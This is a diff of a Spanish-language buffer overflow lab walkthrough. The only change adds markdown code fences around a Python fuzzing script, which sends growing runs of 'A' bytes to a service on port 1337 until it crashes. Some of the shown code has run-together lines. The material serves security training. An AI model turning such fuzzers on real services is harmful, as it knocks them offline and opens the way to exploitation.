@@ -39,7 +39,7 @@ Vemos que nos salen varias opciones como *OVERFLOW1 [value]* básicamente nos es
 Ahora que pasaría si en vez de pasarle como parámetro "test" le pasamos 2000 caracteres, en este caso va a ser el carácter "A". Para eso utilizamos un script en python que empieza a mandarle bytes de forma incremental hasta llegar el punto de que el servidor se satura.
 
 
-    import socket, time, sys
+    ```import socket, time, sys
     ip = "IP MACHINE";  
 	port = 1337  
 	timeout = 5buffer = []  
@@ -59,7 +59,7 @@ Ahora que pasaría si en vez de pasarle como parámetro "test" le pasamos 2000 c
 	    except:  
 	        print("Could not connect to " + ip + ":" + str(port))  
 	        sys.exit(0)  
-	    time.sleep(1)
+	    time.sleep(1)  ```
 
 ![Fuzzing](https://i.ibb.co/GdZrhyr/1-Pkv-BSPNn-BX5-Hsdc21-FURbw.png)
 
